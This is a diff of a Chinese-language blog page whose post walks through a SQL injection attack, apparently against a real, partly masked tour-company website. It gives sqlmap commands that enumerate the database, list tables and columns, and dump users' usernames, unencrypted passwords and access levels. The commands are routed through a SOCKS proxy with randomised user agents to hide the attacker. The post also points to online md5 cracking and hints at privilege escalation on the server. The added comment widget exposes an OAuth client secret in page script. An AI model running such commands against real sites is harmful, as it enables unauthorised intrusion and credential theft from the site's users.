@@ -196,57 +196,25 @@
 
 </li>
 </ul>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="/img/hessel-1.png" alt title>
-                </div>
-                <div class="image-caption"></div>
-            </figure>
+<p><img src="/img/hessel-1.png" alt></p>
 <ul>
 <li>check tables<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://****tours.com/event.php?tourID=1721 -D hesselgrave --tables --proxy socks5://127.0.0.1:1080 --random-agent</span><br></pre></td></tr></table></figure>
 
 </li>
 </ul>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="/img/hessel-2.png" alt title>
-                </div>
-                <div class="image-caption"></div>
-            </figure>
+<p><img src="/img/hessel-2.png" alt></p>
 <ul>
 <li>check columns<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://****tours.com/event.php?tourID=1721 -D hesselgrave -T users --columns --proxy socks5://127.0.0.1:1080 --random-agent</span><br></pre></td></tr></table></figure>
 
 </li>
 </ul>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="/img/hessel-3.png" alt title>
-                </div>
-                <div class="image-caption"></div>
-            </figure>
+<p><img src="/img/hessel-3.png" alt></p>
 <ul>
 <li>dump <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://****tours.com/event.php?tourID=1721 -D hesselgrave -T users -C username,userID,password,accesslevel --dump --proxy socks5://127.0.0.1:1080 --random-agent</span><br></pre></td></tr></table></figure>
 
 </li>
 </ul>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="/img/hessel-4.png" alt title>
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-<p>可见没经过加密。。<br>如果经过了简单加密的话（如mysql的md5(passwd)），就可以找个在线网站撞（比如<a href="https://www.cmd5.com/）" target="_blank" rel="noopener">https://www.cmd5.com/）</a></p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="/img/hessel-5.JPG" alt title>
-                </div>
-                <div class="image-caption"></div>
-            </figure>
+<p><img src="/img/hessel-4.png" alt><br>可见没经过加密。。<br>如果经过了简单加密的话（如mysql的md5(passwd)），就可以找个在线网站撞（比如<a href="https://www.cmd5.com/）" target="_blank" rel="noopener">https://www.cmd5.com/）</a><br><img src="/img/hessel-5.JPG" alt></p>
 <h2 id="后续不贴了。"><a href="#后续不贴了。" class="headerlink" title="后续不贴了。"></a>后续不贴了。</h2><p><strong>防御太低有好几种方法找到路进行提权</strong></p>
 <ul>
 <li>因为在前面已经得到系统是FreeBSD或者是其他linux，并且得到网站运行在的用户名是content，懂我意思吧</li>
@@ -375,6 +343,30 @@
 
 
 
+
+<section class="comments" id="comments">
+    <div id="gitalk-container"></div>
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+        var id = location.pathname
+        if (location.pathname.length > 50) {
+          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
+        }
+        const gitalk = new Gitalk({
+          clientID: '1c48e09d4abbbe0f86a1',
+          clientSecret: 'd42e38dee9898d2c2a362f9feac360efdd5e8e41',
+          repo: 'https://github.com/waynamigo/waynamigo.github.io.git',
+          owner: 'waynamigo',
+          admin: ['waynamigo'],
+          id: id,      // Ensure uniqueness and length less than 50
+          title: document.title.split('|')[0],
+          distractionFreeMode: false  // Facebook-like distraction free mode
+        })
+
+        gitalk.render('gitalk-container')
+    </script>
+</section>
 
 
 
